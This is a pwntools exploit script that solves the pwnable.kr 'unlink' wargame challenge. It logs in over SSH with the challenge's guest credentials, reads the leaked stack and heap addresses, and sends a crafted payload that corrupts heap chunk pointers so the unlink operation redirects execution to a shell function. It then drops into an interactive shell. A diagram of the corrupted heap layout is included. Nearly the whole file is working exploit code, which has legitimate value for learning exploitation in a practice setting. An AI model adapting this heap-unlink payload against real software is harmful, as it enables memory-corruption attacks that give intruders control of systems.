#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch = "i386", os = "linux", bits = 32)
DEBUG = True
DEBUG = False

if DEBUG:
    p = process("./unlink")
else:
    r = ssh(host="pwnable.kr", port=2222, user="unlink", password="guest")
    p = r.process("./unlink")

shell = 0x080484eb

stack = int(p.recvline().strip().split()[-1], base=16)
heap  = int(p.recvline().strip().split()[-1], base=16)


print "[+] A: stack address:", hex(stack)
print "[+] A: heap address:", hex(heap)
p.recvline()

'''
             +------------+--------+
             | ebp - 0x14 | OBJ *A |
+-------+    +------------+--------+
| stack |    | ebp - 0x10 | OBJ *C |
+-------+    +------------+--------+
             | ebp - 0xc  | OBJ *B |
             +------------+--------+

             +----------------+-----+------+       +----------+----------------+
             | chunk header A | 0x0 | 0x19 |       |    0x0   | 0x19            |
             +----------------+-----+------+       +----------+----------------+
             | FD    |  BK    |  B  | 0x0  |       |     B    | 0x0             |
             +----------------+-----+------+       +----------+----------------+
             |      buf       |   junk     |       |   shell  | junk            |
             +----------------+-----+------+       +----------+----------------+
             | chunk header B | 0x0 | 0x19 |       |        junk                |
+------+     +----------------+-----+------+       +----------+----------------+
| heap |     | FD    |  BK    |  C  |  A   |  ==>  | heapA+12 | stackA+0x14-0x4 |
+------+     +----------------+-----+------+       +----------+----------------+
             |      buf       |    0x0     |       |         0x0                |
             +----------------+-----+------+       +----------+----------------+
             | chunk header C | 0x0 | 0x19 |       |    0x0   |      0x19       |
             +----------------+-----+------+       +----------+----------------+
             | FD    |  BK    | 0x0 |  B   |       |    0x0   |       B         |
             +----------------+-----+------+       +----------+----------------+
             |      buf       |    0x0     |       |         0x0                |
             +----------------+-----+------+       +----------+----------------+
'''

junk = "A"*4
payload  = p32(shell) + junk
payload += junk * 2
payload += p32(heap+0xc) + p32(stack+0x14-0x4)

p.sendline(payload)

p.interactive()
p.close()
